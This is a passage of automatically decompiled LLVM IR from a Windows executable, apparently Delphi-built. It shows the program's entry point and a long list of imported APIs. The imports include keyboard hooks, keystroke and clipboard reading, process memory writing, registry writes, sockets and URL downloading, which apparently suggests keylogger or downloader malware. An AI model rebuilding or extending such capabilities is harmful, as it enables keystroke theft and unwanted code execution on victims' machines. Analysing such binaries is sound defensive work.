  %91 = load i8, i8* %90, align 1, !insn.addr !2146
  %92 = udiv i32 %88, 256, !insn.addr !2146
  %93 = trunc i32 %92 to i8, !insn.addr !2146
  %94 = add i8 %91, %93, !insn.addr !2146
  store i8 %94, i8* %90, align 1, !insn.addr !2146
  ret i32 %88, !insn.addr !2146

dec_label_pc_407ab1:                              ; preds = %dec_label_pc_407a15
  %95 = add i32 %46, 1, !insn.addr !2147
  store i32 %95, i32* %eax, align 4, !insn.addr !2147
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2148
  %97 = load i8, i8* %96, align 1, !insn.addr !2148
  %98 = udiv i32 %arg3, 256, !insn.addr !2148
  %99 = trunc i32 %98 to i8, !insn.addr !2148
  %100 = add i8 %97, %99, !insn.addr !2148
  store i8 %100, i8* %96, align 1, !insn.addr !2148
  %101 = add i32 %arg3, 89, !insn.addr !2149
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2149
  store i8 -1, i8* %102, align 1, !insn.addr !2149
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2150
  %103 = load i32, i32* %eax, align 4, !insn.addr !2151
  ret i32 %103, !insn.addr !2151

dec_label_pc_407ac9:                              ; preds = %dec_label_pc_407a48
  %104 = load i32, i32* %eax, align 4, !insn.addr !2152
  ret i32 %104, !insn.addr !2152
}

define i32 @function_407acc() local_unnamed_addr {
dec_label_pc_407acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2153
  %2 = add i32 %1, -1, !insn.addr !2153
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2153
  ret i32 %0, !insn.addr !2154
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2155
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2155
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2155
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2156
  %2 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2157
  %3 = add i32 %2, 1, !insn.addr !2157
  store i32 %3, i32* @global_var_4096f8, align 4, !insn.addr !2157
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2158
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2159
  ret i32 0, !insn.addr !2160
}

define i32 @function_407af9() local_unnamed_addr {
dec_label_pc_407af9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2161
  ret i32 %0, !insn.addr !2161
}

define i32 @function_407afe() local_unnamed_addr {
dec_label_pc_407afe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2162
}

define i32 @function_407b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2163
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2164
  %2 = add i32 %1, -1, !insn.addr !2164
  store i32 %2, i32* @global_var_4096f8, align 4, !insn.addr !2164
  ret i32 %0, !insn.addr !2165
}

define i32 @function_407b0c() local_unnamed_addr {
dec_label_pc_407b0c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2166
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2166
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2166
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2167
  %2 = load i32, i32* @global_var_4096fc, align 4, !insn.addr !2168
  %3 = add i32 %2, 1, !insn.addr !2168
  store i32 %3, i32* @global_var_4096fc, align 4, !insn.addr !2168
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2169
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2170
  ret i32 0, !insn.addr !2171
}

define i32 @function_407b31() local_unnamed_addr {
dec_label_pc_407b31:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2172
  ret i32 %0, !insn.addr !2172
}

define i32 @function_407b36() local_unnamed_addr {
dec_label_pc_407b36:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2173
}

define i32 @function_407b38(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b38:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2174
}

define i32 @function_407b3c() local_unnamed_addr {
dec_label_pc_407b3c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096fc, align 4, !insn.addr !2175
  %2 = add i32 %1, -1, !insn.addr !2175
  store i32 %2, i32* @global_var_4096fc, align 4, !insn.addr !2175
  ret i32 %0, !insn.addr !2176
}

define i32 @function_407b44() local_unnamed_addr {
dec_label_pc_407b44:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2177
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407b6f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2178
  ret i32 %0, !insn.addr !2178
}

define i32 @function_407b74() local_unnamed_addr {
dec_label_pc_407b74:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2179
}

define i32 @function_407b76(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b76:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2180
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407c80:
  %esp.2.reg2mem = alloca i32, !insn.addr !2181
  %esp.1.reg2mem = alloca i32, !insn.addr !2181
  %esp.0.reg2mem = alloca i32, !insn.addr !2181
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2182
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2183
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2183
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2183
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2184
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2185
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_409700 to i8*), i32 0), !insn.addr !2186
  %5 = add i32 %4, ptrtoint (i8** @global_var_409700 to i32), !insn.addr !2187
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2187
  store i8 0, i8* %6, align 1, !insn.addr !2187
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2188
  %8 = call i32 @function_40708c(), !insn.addr !2189
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2190
  %10 = call i32 @function_407104(), !insn.addr !2191
  %11 = trunc i32 %10 to i8, !insn.addr !2192
  %12 = icmp eq i8 %11, 0, !insn.addr !2192
  br i1 %12, label %dec_label_pc_407d87, label %dec_label_pc_407d0c, !insn.addr !2193

dec_label_pc_407d0c:                              ; preds = %dec_label_pc_407c80
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2194
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2195
  store i32 -1, i32* %14, align 4, !insn.addr !2195
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2196
  %16 = call i32 @function_4070cc(), !insn.addr !2197
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2198
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2199
  %19 = call i32 @function_4036c8(), !insn.addr !2200
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2201
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2202
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2203
  %23 = call i32 @function_4036c8(), !insn.addr !2204
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2205
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2205
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2205
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2206
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2206
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2207
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2208
  br label %dec_label_pc_407db4, !insn.addr !2208

dec_label_pc_407d87:                              ; preds = %dec_label_pc_407c80
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2185
  %29 = call i32 @function_4060f0(), !insn.addr !2209
  %30 = call i32 @function_407104(), !insn.addr !2210
  %31 = trunc i32 %30 to i8, !insn.addr !2211
  %32 = icmp eq i8 %31, 0, !insn.addr !2211
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2212
  br i1 %32, label %dec_label_pc_407ef6, label %dec_label_pc_407da9, !insn.addr !2212

dec_label_pc_407da9:                              ; preds = %dec_label_pc_407d87
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2213
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2214
  store i32 -1, i32* %34, align 4, !insn.addr !2214
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2214
  br label %dec_label_pc_407db4, !insn.addr !2214

dec_label_pc_407db4:                              ; preds = %dec_label_pc_407da9, %dec_label_pc_407d0c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2215
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2215
  store i32 260, i32* %36, align 4, !insn.addr !2215
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2216
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2216
  store i32 ptrtoint (i8** @global_var_409700 to i32), i32* %38, align 4, !insn.addr !2216
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2217
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2217
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2218
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2218
  store i32 %40, i32* %42, align 4, !insn.addr !2218
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2219
  %44 = add i32 %43, ptrtoint (i8** @global_var_409700 to i32), !insn.addr !2220
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2220
  store i8 0, i8* %45, align 1, !insn.addr !2220
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2221
  %47 = call i32 @function_4070cc(), !insn.addr !2222
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2223
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2224
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2225
  %51 = icmp eq i32 %50, 0, !insn.addr !2225
  br i1 %51, label %dec_label_pc_407e4d, label %dec_label_pc_407e1a, !insn.addr !2226

dec_label_pc_407e1a:                              ; preds = %dec_label_pc_407db4
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2227
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2227
  store i32 ptrtoint ([16 x i8]* @global_var_407f78 to i32), i32* %53, align 4, !insn.addr !2227
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2228
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2228
  store i32 ptrtoint ([8 x i8]* @global_var_407f88 to i32), i32* %55, align 4, !insn.addr !2228
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2229
  %57 = icmp eq i32* %56, null, !insn.addr !2230
  %58 = icmp eq i1 %57, false, !insn.addr !2231
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2231
  br i1 %58, label %dec_label_pc_407ef6, label %dec_label_pc_407e31, !insn.addr !2231

dec_label_pc_407e31:                              ; preds = %dec_label_pc_407e1a
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2232
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2232
  store i32 ptrtoint (i32* @global_var_409810 to i32), i32* %60, align 4, !insn.addr !2232
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2233
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2233
  store i32 0, i32* %62, align 4, !insn.addr !2233
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2234
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2234
  store i32 66, i32* %64, align 4, !insn.addr !2234
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2235
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2235
  store i32 4220780, i32* %66, align 4, !insn.addr !2235
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2236
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2236
  store i32 0, i32* %68, align 4, !insn.addr !2236
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2237
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2237
  store i32 0, i32* %70, align 4, !insn.addr !2237
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2238
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2239
  br label %dec_label_pc_407ef6, !insn.addr !2239

dec_label_pc_407e4d:                              ; preds = %dec_label_pc_407db4
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2240
  %73 = icmp eq i32 %72, 0, !insn.addr !2240
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2241
  br i1 %73, label %dec_label_pc_407ef6, label %dec_label_pc_407e5b, !insn.addr !2241

dec_label_pc_407e5b:                              ; preds = %dec_label_pc_407e4d
  %74 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2242
  %75 = icmp eq i8 %74, 0, !insn.addr !2242
  br i1 %75, label %dec_label_pc_407e6a, label %dec_label_pc_407e65, !insn.addr !2243

dec_label_pc_407e65:                              ; preds = %dec_label_pc_407e5b
  %76 = call i32 @function_40692c(), !insn.addr !2244
  br label %dec_label_pc_407e6a, !insn.addr !2244

dec_label_pc_407e6a:                              ; preds = %dec_label_pc_407e65, %dec_label_pc_407e5b
  %77 = load i32, i32* @global_var_408148, align 4, !insn.addr !2245
  %78 = icmp slt i32 %77, 1, !insn.addr !2246
  br i1 %78, label %dec_label_pc_407ea7, label %dec_label_pc_407e74, !insn.addr !2246

dec_label_pc_407e74:                              ; preds = %dec_label_pc_407e6a
  %79 = call i32 @function_404d38(), !insn.addr !2247
  %80 = call i32 @"@LStrCmp"(), !insn.addr !2248
  %81 = load i32, i32* @global_var_408154, align 4, !insn.addr !2249
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2250
  store i32 -1, i32* %82, align 4, !insn.addr !2250
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2251
  %84 = icmp eq i32 %83, 0, !insn.addr !2251
  br i1 %84, label %dec_label_pc_407ea7, label %dec_label_pc_407ea2, !insn.addr !2252

dec_label_pc_407ea2:                              ; preds = %dec_label_pc_407e74
  %85 = call i32 @function_40600c(), !insn.addr !2253
  br label %dec_label_pc_407ea7, !insn.addr !2253

dec_label_pc_407ea7:                              ; preds = %dec_label_pc_407ea2, %dec_label_pc_407e74, %dec_label_pc_407e6a
  %86 = add i32 %esp.0.reload, -16, !insn.addr !2254
  %87 = inttoptr i32 %86 to i32*, !insn.addr !2254
  store i32 3, i32* %87, align 4, !insn.addr !2254
  %88 = add i32 %esp.0.reload, -20, !insn.addr !2255
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2255
  store i32 16065, i32* %89, align 4, !insn.addr !2255
  %90 = load i32, i32* @global_var_408118, align 4, !insn.addr !2256
  %91 = add i32 %esp.0.reload, -24, !insn.addr !2257
  %92 = inttoptr i32 %91 to i32*, !insn.addr !2257
  store i32 %90, i32* %92, align 4, !insn.addr !2257
  %93 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2258
  %94 = icmp eq i32* %93, null, !insn.addr !2259
  %95 = icmp eq i1 %94, false, !insn.addr !2260
  store i32 %91, i32* %esp.1.reg2mem, !insn.addr !2260
  br i1 %95, label %dec_label_pc_407ee7, label %dec_label_pc_407ebd, !insn.addr !2260

dec_label_pc_407ebd:                              ; preds = %dec_label_pc_407ea7
  %96 = add i32 %esp.0.reload, -28, !insn.addr !2261
  %97 = inttoptr i32 %96 to i32*, !insn.addr !2261
  store i32 14, i32* %97, align 4, !insn.addr !2261
  %98 = add i32 %esp.0.reload, -32, !insn.addr !2262
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2262
  store i32 16065, i32* %99, align 4, !insn.addr !2262
  %100 = load i32, i32* @global_var_408118, align 4, !insn.addr !2263
  %101 = add i32 %esp.0.reload, -36, !insn.addr !2264
  %102 = inttoptr i32 %101 to i32*, !insn.addr !2264
  store i32 %100, i32* %102, align 4, !insn.addr !2264
  %103 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2265
  %104 = icmp eq i32* %103, null, !insn.addr !2266
  %105 = icmp eq i1 %104, false, !insn.addr !2267
  store i32 %101, i32* %esp.1.reg2mem, !insn.addr !2267
  br i1 %105, label %dec_label_pc_407ee7, label %dec_label_pc_407ed3, !insn.addr !2267

dec_label_pc_407ed3:                              ; preds = %dec_label_pc_407ebd
  %106 = add i32 %esp.0.reload, -40, !insn.addr !2268
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2268
  store i32 16065, i32* %107, align 4, !insn.addr !2268
  %108 = load i32, i32* @global_var_408118, align 4, !insn.addr !2269
  %109 = add i32 %esp.0.reload, -44, !insn.addr !2270
  %110 = inttoptr i32 %109 to i32*, !insn.addr !2270
  store i32 %108, i32* %110, align 4, !insn.addr !2270
  %111 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2271
  %112 = icmp eq i32* %111, null, !insn.addr !2272
  store i32 %109, i32* %esp.1.reg2mem, !insn.addr !2273
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !2273
  br i1 %112, label %dec_label_pc_407ef6, label %dec_label_pc_407ee7, !insn.addr !2273

dec_label_pc_407ee7:                              ; preds = %dec_label_pc_407ed3, %dec_label_pc_407ebd, %dec_label_pc_407ea7
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %113 = call i32 @function_4079a0(), !insn.addr !2274
  store i32 4225860, i32* @global_var_409654, align 4, !insn.addr !2275
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2275
  br label %dec_label_pc_407ef6, !insn.addr !2275

dec_label_pc_407ef6:                              ; preds = %dec_label_pc_407ee7, %dec_label_pc_407ed3, %dec_label_pc_407e4d, %dec_label_pc_407e31, %dec_label_pc_407e1a, %dec_label_pc_407d87
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %114 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2276
  %115 = load i32, i32* %114, align 4, !insn.addr !2276
  call void @__writefsdword(i32 0, i32 %115), !insn.addr !2277
  %116 = add i32 %esp.2.reload, 8, !insn.addr !2278
  %117 = inttoptr i32 %116 to i32*, !insn.addr !2278
  store i32 4226840, i32* %117, align 4, !insn.addr !2278
  %118 = call i32 @"@LStrArrayClr"(), !insn.addr !2279
  ret i32 %118, !insn.addr !2280
}

define i32 @function_407f11() local_unnamed_addr {
dec_label_pc_407f11:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2281
  ret i32 %0, !insn.addr !2281
}

define i32 @function_407f16() local_unnamed_addr {
dec_label_pc_407f16:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2282
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare void @__asm_into(i32) local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare void @__asm_arpl(i16, i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare void @__writegsbyte(i32, i8) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_11() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
